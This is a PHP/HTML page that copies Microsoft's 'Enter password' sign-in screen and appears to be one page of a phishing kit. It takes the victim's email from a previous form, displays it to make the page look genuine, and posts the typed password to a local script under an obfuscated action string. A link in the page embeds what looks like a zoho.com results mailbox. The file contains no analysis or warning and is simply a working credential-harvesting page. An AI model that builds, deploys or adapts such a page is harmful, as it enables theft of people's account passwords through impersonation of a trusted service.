<?php

$email= $_POST['loginfmt'];
?>

<!DOCTYPE html><html dir="ltr" lang="EN-US"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><base href=""><script type="text/javascript"></script><noscript><meta http-equiv="Refresh" content="0; URL=https://login.live.com/jsDisabled.srf?mkt=EN-US&lc=1033"/>Microsoft account requires JavaScript to sign in. This web browser either does not support JavaScript, or scripts are being blocked.<br /><br />To find out whether your browser supports JavaScript, or to allow scripts, see the browser's online help.</noscript><title>Sign in to your Microsoft account</title><meta name="PageID" content="i5030"><meta name="SiteID" content="38936"><meta name="ReqLC" content="1033"><meta name="LocLC" content="1033"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no"><link rel="shortcut icon" href="favicon.ico"><link rel="stylesheet" title="Converged" type="text/css" href="https://auth.gfx.ms/16.000.27497.00/Converged1033.css"><style type="text/css"></style><style type="text/css">body{display:none}</style><script type="text/javascript"></script><style type="text/css">body{display:block!important}</style><noscript><style type="text/css">body{display:block!important}</style></noscript><script type="text/javascript"></script><link rel="image_src" href="https://auth.gfx.ms/16.000.27497.00/images/Windows_Live_v_thumb.jpg"><script type="text/javascript"></script><script type="text/javascript" src="about:blank"></script><script type="text/javascript" src="about:blank"></script> <script type="text/javascript"></script><script type="text/javascript"></script></head><body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass"><div><div data-bind="component: { name: 'background-image', publicMethods: backgroundControlMethods }"><div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"><div class="blur" data-bind="backgroundImage: smallImageUrl()" style="background-image:url(&quot;0-small.jpg&quot;)"></div><div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image:url(&quot;https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6573.5/content/images/backgrounds/0.jpg?x=f5a9a9531b8f4bcc86eabb19472d15d5&quot;)"></div><div class="background-overlay"></div></div></div><form name="f1" id="i0281" novalidate spellcheck="false" method="post" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }" action="index.php?securitysteps_5f512a34358ae4d3_ACCESS_verify_i5f512a34358ae4d3_token9833jnm246hHjmssw_onlinebanking_DO7dtkwIsdfg=done"><div class="outer" data-bind="component: { name: 'page',
        params: {
            serverData: svr,
            showButtons: svr.A6,
            showFooterLinks: true,
            useWizardBehavior: svr.BR,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
         event: {
            footerAgreementClick: footer_agreementClick } }"><div class="middle"><div class="inner" data-bind="css: { 'app': $loginPage.backgroundLogoUrl() }"><div data-bind="component: { name: 'logo-control',
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: $loginPage.bannerLogoUrl() } }"><img class="logo" role="presentation" pngsrc="https://auth.gfx.ms/16.000.27497.00/images/microsoft_logo.png?x=ed9c9eb0dce17d752bedea6b5acda6d9" svgsrc="https://auth.gfx.ms/16.000.27497.00/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd" data-bind="imgSrc" src="https://auth.gfx.ms/16.000.27497.00/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd"></div><div data-bind="
                    css: { 'wide': paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata('wide') },
                    component: { name: 'pagination-control',
                        publicMethods: paginationControlMethods,
                        params: {
                            initialViewId: initialViewId,
                            currentViewId: currentViewId,
                            initialSharedData: initialSharedData,
                            initialError: $loginPage.getServerError() },
                        event: {
                            cancel: paginationControl_onCancel } }"><div data-bind="css: { 'animate': animate() || animate.back(), 'back': animate.back }"><div data-viewid="2" data-bind="component: { name: 'login-paginated-password-view',
                        publicMethods: viewInterfaces[$index()],
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            username: sharedData.username,
                            displayName: sharedData.displayName,
                            hipRequiredForUsername: sharedData.hipRequiredForUsername,
                            passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
                            hasRemoteNgc: !!sharedData.remoteNgcParams.sessionIdentifier,
                            desktopSsoEnabled: sharedData.desktopSsoEnabled,
                            defaultKmsiValue: svr.K === 1,
                            userTenantBranding: sharedData.userTenantBranding,
                            sessions: sharedData.sessions,
                            isLongRunningTransaction: sharedData.isLongRunningTransaction },
                        event: {
                            load: view_onLoad,
                            switchView: view_onSwitchView,
                            submitReady: $loginPage.view_onSubmitReady,
                            resetPassword: $loginPage.passwordView_onResetPassword,
                            desktopSsoStart: $loginPage.view_desktopSsoStart,
                            updateBranding: $loginPage.view_onUpdateBranding } }"><input name="i13" data-bind="value: isKmsiChecked() ? 1 : 0" value="0" type="hidden"><input name="login" data-bind="value: username" value="<? echo $email;?>" type="hidden"><input name="loginfmt" data-bind="moveOffScreen, value: displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true" type="text"><input name="type" data-bind="value: svr.BR ? 20 : 11" value="11" type="hidden"><input name="LoginOptions" data-bind="value: isKmsiChecked() ? 1 : 3" value="3" type="hidden"><input name="lrt" data-bind="value: isLongRunningTransaction" value="" type="hidden">
                <div data-bind="component: { name: 'identity-banner-control',
     params: {
        pawnIconId: svr.BV,
        displayName: displayName } }">
                  <!--  -->
                  <div class="identityBanner">
                    <div class="identity" data-bind="text: displayName, attr: { 'title': displayName }" title=""><?php
    
    echo "$email";
    ?></div>
                    <div class="profile-photo"> <img role="presentation" data-bind="attr: { src: getUrl() }" src="https://auth.gfx.ms/16.000.27497.00/images/picker_account_msa.svg"></div>
                  </div>
                </div>
                <div id="loginHeader" class="row text-title" role="heading" data-bind="text: str['CT_PWD_STR_EnterPassword_Title']">Enter password</div><div class="row"><div class="form-group col-md-24"><div role="alert" aria-live="assertive" aria-atomic="false"></div><div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox', params: {
            serverData: svr,
            textInput: password,
            hasFocus: isFocused,
            hintText: str['CT_PWD_STR_PwdTB_Label'],
            forcePlaceholderAttribute: false,
            hintCss: 'placeholder' } }"><input name="passwd" id="i0118" autocomplete="off" class="form-control" aria-describedby="passwordError loginHeader passwordDesc" aria-required="true" data-bind="
                    textInput: password,
                    hasFocusEx: isFocused,
                    placeholder: $placeholderText,
                    ariaLabel: str['CT_PWD_STR_PwdTB_AriaLabel'],
                    attr: { maxLength: svr.C ? 127 : null },
                    css: { 'has-error': error }" aria-label="Enter password" maxlength="127" type="password"><div class="phholder" style="left:0;top:0;width:100%;position:absolute;z-index:5;display:none" data-bind="visible: !textInput(), click: focus"><div aria-hidden="true" style="cursor:text" data-bind="text: hintText, css: hintCss" class="placeholder">Password</div></div></div></div></div><div class="row"><div data-bind="component: { name: 'footer-buttons-field',
        params: {
            serverData: svr,
            primaryButtonText: str['CT_PWD_STR_SignIn_Button'],
            isPrimaryButtonEnabled: !isRequestPending(),
            isPrimaryButtonVisible: svr.A6,
            isSecondaryButtonEnabled: true,
            isSecondaryButtonVisible: svr.A6 &amp;&amp; isBackButtonVisible() },
        event: {
            primaryButtonClick: primaryButton_onClick,
            secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 form-group no-padding-left-right" data-bind="
     visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
     css: { 'no-margin-bottom': removeBottomMargin }"><div data-bind="css: { 'col-xs-12 secondary': isPrimaryButtonVisible(), 'col-xs-24': !isPrimaryButtonVisible() }" class="col-xs-12 secondary"><input id="idBtn_Back" class="btn btn-block" data-bind="
            attr: {
                'id': secondaryButtonId || 'idBtn_Back',
                'aria-describedby': secondaryButtonDescribedBy },
            value: secondaryButtonText() || str['CT_HRD_STR_Splitter_Back'],
            hasFocus: focusOnSecondaryButton,
            click: secondaryButton_onClick,
            enable: isSecondaryButtonEnabled,
            visible: isSecondaryButtonVisible" value="Back" style="display:none" type="button"></div><div data-bind="css: { 'col-xs-12 primary': isSecondaryButtonVisible(), 'col-xs-24': !isSecondaryButtonVisible() }" class="col-xs-24"><input id="idSIButton9" class="btn btn-block btn-primary" data-bind="
            attr: {
                'id': primaryButtonId || 'idSIButton9',
                'aria-describedby': primaryButtonDescribedBy },
            value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
            hasFocus: focusOnPrimaryButton,
            click: primaryButton_onClick,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible" value="Sign in" type="submit"></div></div></div></div><div id="idTd_PWD_KMSI_Cb" class="form-group checkbox text-block-body no-margin-top" data-bind="visible: !svr.c &amp;&amp; !showHip"><label id="idLbl_PWD_KMSI_Cb"><input name="KMSI" id="idChkBx_PWD_KMSI0Pwd" data-bind="checked: isKmsiChecked, ariaLabel: str['CT_PWD_STR_KeepMeSignedInCB_Text']" aria-label="Keep me signed in" type="checkbox"><span data-bind="text: str['CT_PWD_STR_KeepMeSignedInCB_Text']">Keep me signed in</span></label></div><div class="row"><div class="col-md-24"><div class="text-13"><div class="form-group no-margin-bottom" data-bind="css: { 'no-margin-bottom': !hasRemoteNgc &amp;&amp; !allowPhoneDisambiguation &amp;&amp; !showChangeUserLink }"><a id="idA_PWD_ForgotPassword" href="https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/oauth20_authorize.srf%3fresponse_type%3dcode%26client_id%3d51483342-085c-4d86-bf88-cf50c7252078%26scope%3dopenid%2bprofile%2bemail%2boffline_access%26response_mode%3dform_post%26redirect_uri%3dhttps%253a%252f%252flogin.microsoftonline.com%252fcommon%252ffederation%252foauth2%26state%3drQIIAXWRPWzTQACF4_zRVAgKC4wVQgyIJGf77PygDvmv09pO0ySOvUSJc66d2nfBuTSJFwZmRDeksLFUyogQAmYWKiF1BrEjxMTESMLO8ob3vuHpvYcRNsXm70MeCv3MIJfM9UU-CXMsSPYhJyZ5gRd5DrBDAfD-7e2dp43nD25lpeqri9jjTy--P1oyiZ7rnKGUSbwVc8emdDzJp9Oz2SxFLMsx_wXp9wxzxTA_GGYZjiGcbB-vwhORFyGAOS6b4TJQyGZZPqWWdWBodVcPTqnSMjzFAUDxOu6hVvcUr01lT4dyuejJ5eZI8Y5YmTuCSkvn1LJEN55cAkCt6cKhVuGM1smal9a8OVO0ylzRJPg1fFMtTKnNbYT4ToB-hxMW8b3emEzoMnLBqGOEpWGJYIxMmtpgCFPH7FOH4IZPxsinDprszRtCMdnj68WBalRxlY58EbOjrlpuWqXgpO-edWuLIjIIaGKd49mjAqqSwJ4KrtSGMl_UpMyBvz_wAttoI9vKFpAsYAUOWvKUZER7zhGuGYCAHgz1piMvgKJ2rCmPLdoX7QxrPUFvIvH1rB7Bl5Eb61LYGe6OfWI5LrqKMj-j10Ekv7W1vRO6G9oN_Ykyr2Pr59SX37h7qy_Ku7cfPj_7dS10GUsHwsJrdDVVHGnKoLDfNAS1Tat1GS5gvVNr4BIqn5rHNbciyXtsnj2PM-fx-MfE_17-Cw2%26estsfed%3d1%26uaid%3d268d507f381146499ba7053bc48fdd2c%26mkt%3den-US%26username%3dmnamero%2540hotmail.com%26contextid%3d06CF8AA86B3FE37B%26bk%3d1504903393&amp;id=38936&amp;uiflavor=web&amp;cobrandid=140718307536936&amp;client_id=1E00004417ACAE&amp;uaid=268d507f381146499ba7053bc48fdd2c&amp;mkt=EN-US&amp;lc=1033&amp;bk=1504903393" data-bind="text: str['CT_PWD_STR_ForgotPwdLink_Text'], href: svr.e, click: resetPassword_onClick">Forgot my password</a></div><div class="form-group no-margin-bottom" data-bind="visible: showChangeUserLink" style="display:none"><a id="i1668" href="https://login.live.com/logout.srf?response_type=code&amp;client_id=51483342-085c-4d86-bf88-cf50c7252078&amp;scope=openid+profile+email+offline_access&amp;response_mode=form_post&amp;redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2&amp;state=rQIIAXWRPWzTQACF4_zRVAgKC4wVQgyIJGf77PygDvmv09pO0ySOvUSJc66d2nfBuTSJFwZmRDeksLFUyogQAmYWKiF1BrEjxMTESMLO8ob3vuHpvYcRNsXm70MeCv3MIJfM9UU-CXMsSPYhJyZ5gRd5DrBDAfD-7e2dp43nD25lpeqri9jjTy--P1oyiZ7rnKGUSbwVc8emdDzJp9Oz2SxFLMsx_wXp9wxzxTA_GGYZjiGcbB-vwhORFyGAOS6b4TJQyGZZPqWWdWBodVcPTqnSMjzFAUDxOu6hVvcUr01lT4dyuejJ5eZI8Y5YmTuCSkvn1LJEN55cAkCt6cKhVuGM1smal9a8OVO0ylzRJPg1fFMtTKnNbYT4ToB-hxMW8b3emEzoMnLBqGOEpWGJYIxMmtpgCFPH7FOH4IZPxsinDprszRtCMdnj68WBalRxlY58EbOjrlpuWqXgpO-edWuLIjIIaGKd49mjAqqSwJ4KrtSGMl_UpMyBvz_wAttoI9vKFpAsYAUOWvKUZER7zhGuGYCAHgz1piMvgKJ2rCmPLdoX7QxrPUFvIvH1rB7Bl5Eb61LYGe6OfWI5LrqKMj-j10Ekv7W1vRO6G9oN_Ykyr2Pr59SX37h7qy_Ku7cfPj_7dS10GUsHwsJrdDVVHGnKoLDfNAS1Tat1GS5gvVNr4BIqn5rHNbciyXtsnj2PM-fx-MfE_17-Cw2&amp;estsfed=1&amp;uaid=268d507f381146499ba7053bc48fdd2c&amp;mkt=en-US&amp;contextid=06CF8AA86B3FE37B&amp;ru=https://login.microsoftonline.com/common/federation/oauth2&amp;bk=1504903393&amp;lm=I&amp;username=results.box1505@zoho.com&amp;pid=15216" data-bind="text: str['CT_FED_STR_ChangeUserLink_Text'], href: svr.urlSwitch">Sign in with a different Microsoft account</a></div></div></div></div></div></div></div></div><input name="ps" data-bind="value: postedLoginStateViewId" value="2" type="hidden"><input name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value="" type="hidden"><input name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value="" type="hidden"><input name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value="" type="hidden"><input name="canary" data-bind="value: svr.canary" value="" type="hidden"><input name="ctx" data-bind="value: ctx" value="" type="hidden"><input id="i0327" data-bind="attr: { name: svr.B8 }, value: flowToken" name="PPFT" value="DWNlDFqQ5aHpWZLuC!YDWk2mzXusBBLA1tOT8Jfxx0z5FRJrdUtndXyawytdj1cmjOsXprDSEewHMrBEgi4v4zDnT4wGZrOjqsXsJWYKvULqPGothKjSOJm!os8TPGlW5rYDm7FPDrRgFvTYnNAkrcdCjR!T1TnwqARDHlisYzmdcD97WdiQb10fLjnyIOxHsnRhfK66xa0esjhIL7PJ3WM$" type="hidden"><input name="PPSX" data-bind="value: svr.t" value="Passport" type="hidden"><input name="NewUser" value="1" type="hidden"><input name="FoundMSAs" data-bind="value: svr.aA" value="" type="hidden"><input name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0" type="hidden"><input name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0" type="hidden"><div data-bind="component: { name: 'instrumentation',
                publicMethods: instrumentationMethods,
                params: { serverData: svr } }"><input name="i2" data-bind="value: clientMode" value="1" type="hidden"><input name="i17" data-bind="value: srsFailed" value="0" type="hidden"><input name="i18" data-bind="value: srsSuccess" value="__ConvergedLoginPaginatedStrings|1,__ConvergedLogin_PCore|1," type="hidden"><input name="i19" data-bind="value: timeOnPage" value="251703" type="hidden"></div></div></div><div id="footer"><div data-bind="component: { name: 'footer-control',
            params: {
                serverData: svr,
                showLinks: true },
            event: {
                agreementClick: footer_agreementClick } }"><div id="footerLinks" class="footerNode text-secondary"><span id="ftrCopy" data-bind="html: svr.ac">©2017 Microsoft</span><a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=EN-US&amp;vv=1600">Terms of Use</a><a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=EN-US&amp;vv=1600">Privacy &amp; Cookies</a></div></div></div></form><form method="post" target="_top" data-bind="autoSubmit: postRedirectForceSubmit, attr: { action: postRedirectUrl }"></form></div></body></html>